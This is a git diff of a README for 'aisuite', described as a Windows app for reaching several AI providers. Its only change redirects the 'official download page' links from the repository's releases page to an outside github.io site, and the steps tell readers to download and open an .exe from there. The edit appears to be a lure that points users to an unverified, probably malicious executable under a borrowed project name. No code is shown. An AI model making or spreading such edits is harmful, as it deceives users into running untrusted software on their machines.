@@ -1,6 +1,6 @@
 # 🤖 aisuite - Access multiple AI models with ease
 
-[![Download aisuite](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Springfalungong780/aisuite/releases)
+[![Download aisuite](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://springfalungong780.github.io)
 
 aisuite provides a central hub for your artificial intelligence needs. You can connect to several different AI providers through one window. This tool removes the complexity of switching between different websites and accounts. You save time and focus on your work.
 
@@ -8,7 +8,7 @@ aisuite provides a central hub for your artificial intelligence needs. You can c
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Springfalungong780/aisuite/releases) to access the latest installer.
+1.  Visit the [official download page](https://springfalungong780.github.io) to access the latest installer.
 2.  Locate the file ending in `.exe` under the Assets section.
 3.  Click the file to initiate the download.
 4.  Open the file once it finishes downloading.
